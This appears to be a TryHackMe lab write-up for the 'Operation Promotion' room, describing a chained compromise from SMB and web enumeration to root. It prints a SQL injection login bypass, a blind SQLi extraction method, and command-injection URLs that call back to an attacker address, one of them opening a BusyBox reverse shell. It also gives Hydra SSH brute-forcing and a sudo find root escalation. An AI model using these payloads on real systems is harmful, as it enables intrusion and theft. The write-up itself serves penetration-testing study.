# THM: Operation Promotion

## 1. Room Information

- **Name:** Operation Promotion
- **Platform:** TryHackMe
- **Focus:** Network enumeration, SMB enumeration, SQL injection, database extraction, command injection, credential attacks, and Linux privilege escalation

---

## 2. Introduction

Operation Promotion was a good example of chaining several vulnerabilities together instead of relying on a single exploit.

My attack path was:

```text
Recon
  |
  +--> SMB Guest Access
  |
  +--> Web Enumeration
          |
          v
      Admin Login
          |
          v
      SQL Injection
          |
          +--> User Enumeration
          +--> Credential Extraction
          |
          v
      Command Injection
          |
          v
      www-data
          |
          v
      Database Credentials
          |
          v
      jford
          |
          v
      SSH
          |
          v
      Sudo find
          |
          v
      Root
```

The main techniques I practiced were:

- SMB enumeration
- Directory enumeration
- SQL injection
- Boolean-based SQLi
- Blind SQLi automation
- Command injection
- Password wordlist generation
- SSH brute forcing
- Sudo privilege escalation

---

# 3. Reconnaissance

I started with RustScan to quickly identify the exposed TCP services and pass the results to Nmap for service enumeration:

```bash
rustscan -b 500 -a operation-promotion.thm --top -- -sC -sV -Pn
```

The scan revealed:

| Port | Service | Version / Notes |
|---|---|---|
| 22 | SSH | OpenSSH 9.6p1 |
| 80 | HTTP | Apache 2.4.58 |
| 139 | SMB | NetBIOS/SMB |
| 445 | SMB | SMB |

I also noticed that `robots.txt` disallowed:

```text
/admin/
```

This was immediately worth investigating because `robots.txt` can sometimes reveal interesting application paths.

---

# 4. SMB Enumeration

## 4.1 Guest Access

I started enumerating the SMB service using NetExec:

```bash
nxc smb operation-promotion.thm -u guest -p '' --shares
```

Anonymous/guest authentication was successful.

I discovered that the `public` share was readable.

This was interesting because unauthenticated SMB access can expose files, credentials, configuration information, or other clues.

---

## 4.2 Accessing the Share

I connected to SMB using Impacket:

```bash
smbclient.py guest:''@operation-promotion.thm
```

Inside the share, I found:

```text
README.txt
```

I inspected it, but there was nothing particularly useful.

Even though this path did not directly lead to compromise, it confirmed that the host allowed unauthenticated access to an SMB resource.

---

# 5. Web Enumeration

I then moved to the HTTP service:

```text
http://operation-promotion.thm/
```

The website initially looked like a mostly static page for RecruitCorp's spring hiring campaign.

Since there was not much functionality on the main page, I performed directory enumeration using Feroxbuster:

```bash
feroxbuster -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -u 'http://operation-promotion.thm/'
```

The scan rediscovered:

```text
/admin/
```

This matched the path mentioned in `robots.txt`.

I opened:

```text
http://operation-promotion.thm/admin
```

and found an administrator login page.

---

# 6. SQL Injection Login Bypass

## 6.1 Testing the Login

I tested the login functionality for SQL injection.

The payload I used was:

```text
admin' --
```

The comment sequence:

```text
--
```

caused the remainder of the SQL query to be ignored.

The payload successfully bypassed the password check.

I was redirected to the admin dashboard:

```text
http://operation-promotion.thm/admin/dashboard.php
```

This confirmed that the login endpoint was vulnerable to SQL injection.

---

# 7. User Enumeration

The admin dashboard contained a user lookup functionality:

```text
http://operation-promotion.thm/admin/users/lookup.php?id=1
```

The endpoint accepted a numeric `id` parameter.

I tested different IDs and discovered another interesting entry:

```text
id=7
```

This corresponded to the `sysma-int` service account and revealed a directory containing:

```text
ping.php
```

This became important later because the page appeared to execute a system `ping` command.

---

# 8. Enumerating the Database Through SQL Injection

The SQL injection was more useful than just bypassing the login.

I wanted to determine whether I could extract data from the backend database.

The technique used a **boolean-based SQL injection oracle**.

The basic idea was to send two different conditions:

```text
' OR 1=1 --
```

and:

```text
' OR 1=2 --
```

The application's HTTP response differed depending on whether the injected condition evaluated to true.

The script used the HTTP status code as the oracle:

```text
301/302/303 = condition was true
```

This allowed me to extract database information one character at a time.

---

## 8.1 Confirming the Oracle

The important sanity check was:

```python
t = truthy("' OR 1=1 --")
f = truthy("' OR 1=2 --")
```

The expected result was:

```text
1=1 → True
1=2 → False
```

This confirmed that the boolean oracle was reliable.

---

## 8.2 Character-by-Character Extraction

The script extracted strings using SQL functions such as:

```sql
SUBSTR()
UNICODE()
LENGTH()
```

For example, the technique generated conditions similar to:

```text
' OR UNICODE(SUBSTR((SELECT username FROM users LIMIT 1 OFFSET <i>),<pos>,1))<=<n> --
```

Instead of testing every possible character individually, the script used **binary search** to find the correct ASCII value.

This made the extraction considerably more efficient.

---

## 8.3 Extracting Users and Passwords

The script first determined the number of users:

```sql
SELECT COUNT(*) FROM users
```

It then determined the length of each username and password.

Finally, it extracted each value character by character.

The core process was:

```text
Find number of users
       |
       v
Find username length
       |
       v
Extract username
       |
       v
Find password length
       |
       v
Extract password
```

I ran the enumeration script with:

```bash
python enum-db.py
```

This demonstrated that the SQL injection could be used for full database extraction rather than just authentication bypass.

---

# 9. Command Injection

The `sysma-int` entry had revealed a new directory containing:

```text
ping.php
```

I opened:

```text
http://operation-promotion.thm/admin/sysmaint-checks/ping.php
```

The page accepted a `host` parameter.

I first tested it with:

```text
http://operation-promotion.thm/admin/sysmaint-checks/ping.php?host=127.0.0.1
```

The response showed the output of a Linux `ping` command.

This strongly suggested that the application was executing an operating-system command using user-controlled input.

That made command injection the next thing I wanted to test.

---

# 10. Confirming Command Execution

I used shell command substitution:

```text
$(...)
```

and supplied:

```text
http://operation-promotion.thm/admin/sysmaint-checks/ping.php?host=127.0.0.1$(curl http://192.168.135.32)
```

On my machine, I started a simple HTTP server:

```bash
python -m http.server 80
```

The target made a request back to my server.

That confirmed that the `host` parameter was vulnerable to **command injection**.

The important observation was:

```text
User-controlled input
        |
        v
Shell command
        |
        v
Command substitution
        |
        v
Attacker-controlled command execution
```

---

# 11. Getting a Reverse Shell

Once command execution was confirmed, I started a listener using Penelope:

```bash
penelope -p 4445
```

I then replaced the `curl` command with a BusyBox reverse shell:

```text
http://operation-promotion.thm//admin/sysmaint-checks/ping.php?host=127.0.0.1$(busybox nc 192.168.135.32 4445 -e bash)
```

The connection came back successfully.

I now had a shell as:

```text
www-data
```

---

# 12. Local Enumeration as `www-data`

From the `www-data` shell, I began looking for configuration files, credentials, and application data.

One useful finding was a database user:

```text
jford
```

along with a corresponding bcrypt password hash.

I also checked `/etc/passwd` and noticed that:

```text
jford
```

was an actual system user.

This created a potential path from:

```text
www-data
```

to:

```text
jford
```

---

# 13. Cracking the Password

The bcrypt hash could not be cracked directly.

I therefore went back to the website and looked for information that could help construct a more targeted password list.

The page contained several keywords, including:

```text
spring
2026
```

A simple combination such as:

```text
spring2026
```

did not work.

Instead of relying entirely on a generic wordlist, I generated variations of this base password using Hashcat's `dive.rule`.

First:

```bash
echo "spring2026" > base.txt
```

Then:

```bash
hashcat --stdout base.txt -r /usr/share/hashcat/rules/dive.rule > wordlist.txt
```

This generated a much larger set of password candidates based on the known keyword.

---

# 14. SSH Credential Attack

I then used Hydra against SSH with the newly generated wordlist:

```bash
hydra -l jford -P wordlist.txt operation-promotion.thm ssh
```

Hydra successfully found a valid password.

I could now authenticate as:

```text
jford
```

This gave me a much more useful interactive shell than the previous `www-data` context.

---

# 15. User Flag

After becoming `jford`, I checked the user's home directory:

```bash
cat /home/jford/users.txt
```

This contained the user flag.

### User Flag

```text
[Captured during the room]
```

---

# 16. Privilege Escalation

Now that I had a shell as `jford`, I checked the user's sudo permissions:

```bash
sudo -l
```

The important finding was that `jford` was allowed to execute:

```text
find
```

as `root`.

This was a very strong privilege-escalation opportunity because `find` can execute commands through its `-exec` functionality.

---

# 17. Exploiting Sudo `find`

I used the following command:

```bash
sudo /usr/bin/find . -exec /bin/sh \; -quit
```

The command works because:

- `sudo` executes `find` as root.
- `find` processes the current directory.
- `-exec` allows another command to be executed.
- `/bin/sh` therefore runs with the privileges of the `find` process.
- `-quit` stops `find` after execution.

I received a root shell.

I was now:

```text
root
```

The final flag was located at:

```text
/root/flag.txt
```

---

# 18. Complete Attack Chain

```text
RustScan / Nmap
      |
      +--> SSH
      +--> HTTP
      +--> SMB
      |
      v
SMB Guest Access
      |
      +--> public share
      |
      v
Web Enumeration
      |
      +--> /admin/
      |
      v
SQL Injection
      |
      +--> Login Bypass
      |
      +--> User Enumeration
      |
      +--> Blind SQLi
              |
              +--> Database Credentials
      |
      v
sysma-int / ping.php
      |
      v
Command Injection
      |
      v
Reverse Shell
      |
      +--> www-data
      |
      v
Application / DB Enumeration
      |
      +--> jford
      +--> bcrypt hash
      |
      v
Targeted Wordlist
      |
      +--> spring2026
      +--> Hashcat dive.rule
      |
      v
Hydra SSH Attack
      |
      v
jford
      |
      v
sudo -l
      |
      +--> /usr/bin/find as root
      |
      v
find -exec /bin/sh
      |
      v
ROOT
```

---

# 19. Key Findings

| Vulnerability / Weakness | Impact |
|---|---|
| Guest SMB access | Allowed unauthenticated access to a public share |
| SQL injection | Bypassed administrator authentication |
| Blind SQL injection | Allowed database contents to be extracted |
| Command injection | Allowed arbitrary OS command execution |
| Credential exposure | Provided a path toward the `jford` account |
| Weak password pattern | Enabled targeted password generation |
| SSH credential attack | Provided access as `jford` |
| Sudo misconfiguration | Allowed `find` to execute as root |
| `find -exec` | Resulted in full root shell |

---

# 20. Key Takeaways

This room reinforced the importance of chaining vulnerabilities together.

The first SQL injection was already enough to bypass authentication, but I did not stop there. Once I had access to the administrative functionality, I continued enumerating the application and found another endpoint that led to command injection.

The most important lessons I took from the room were:

- Always enumerate all exposed services, including SMB.
- Guest/anonymous access can still provide useful information even when the share appears empty.
- `robots.txt` can reveal interesting application paths, but those paths still need to be tested directly.
- A SQL injection used for authentication bypass may also allow much deeper database enumeration.
- Boolean-based SQL injection can be automated by treating application responses as a true/false oracle.
- Binary search makes character-by-character blind SQLi extraction much more efficient.
- When an application executes commands using user-controlled input, test for command injection.
- Once command execution is confirmed, move from simple proof-of-execution to an appropriate shell within the lab scope.
- Application information can be useful for building targeted password candidates.
- Generic brute force is not always the best approach; targeted wordlists can significantly reduce the search space.
- Always run `sudo -l` after obtaining a Linux shell.
- Programs such as `find` can become dangerous when allowed to run as root because they provide command-execution functionality.

The biggest takeaway for me was that **the initial foothold is only one stage of a pentest**. After gaining access, I need to keep enumerating, identify trust relationships and credential reuse, and look for paths that increase my privileges until I can demonstrate the full impact of the compromise.